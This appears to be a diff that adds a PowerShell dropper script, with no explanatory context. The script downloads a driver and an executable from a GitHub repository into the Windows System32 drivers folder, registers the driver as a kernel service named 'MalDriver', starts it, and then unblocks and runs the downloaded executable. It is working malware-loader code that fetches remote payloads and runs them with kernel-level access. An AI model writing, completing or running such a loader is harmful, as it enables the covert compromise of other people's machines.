@@ -1,0 +1,43 @@
+$BaseUrl = "https://github.com/70r3n7/fk38du56/raw/refs/heads/main"
+$DriverName = "metadata.sys"
+$DataName = "Data.exe"
+
+$DriverPath = "C:\Windows\System32\drivers\$DriverName"
+$DataPath = "C:\Windows\System32\drivers\$DataName"
+
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
+
+$Downloads = @{
+    "$BaseUrl/$DriverName" = $DriverPath
+    "$BaseUrl/$DataName"   = $DataPath
+}
+
+Write-Host "[*] Initializing BITS Transfer..." -ForegroundColor Cyan
+
+foreach ($Item in $Downloads.GetEnumerator()) {
+    try {
+        # Use BITS for robust, resumable delivery
+        Start-BitsTransfer -Source $Item.Key -Destination $Item.Value -DisplayName "ComponentDownload" -Priority High -ErrorAction Stop
+        
+        if (Test-Path $Item.Value) {
+            Write-Host "[+] Successfully delivered: $($Item.Value)" -ForegroundColor Green
+        }
+    } catch {
+        Write-Host "[-] BITS failed for $($Item.Key). Falling back to WebRequest..." -ForegroundColor Yellow
+        try {
+            # Fallback to standard HTTP if BITS service is disabled
+            Invoke-WebRequest -Uri $Item.Key -OutFile $Item.Value -UseBasicParsing -ErrorAction Stop
+            Write-Host "[+] Fallback success." -ForegroundColor Green
+        } catch {
+            Write-Host "[!] Critical Failure: $($_.Exception.Message)" -ForegroundColor Red
+        }
+    }
+}
+
+Write-Host "[*] Registering Kernel Service..." -ForegroundColor Cyan
+sc.exe create MalDriver binPath= $DriverPath type= kernel start= demand | Out-Null
+sc.exe start MalDriver | Out-Null
+UnBlock-File $DataPath
+Start-Process "C:\windows\system32\cmd.exe" -ArgumentList "/c","$DataPath"
+exit
+
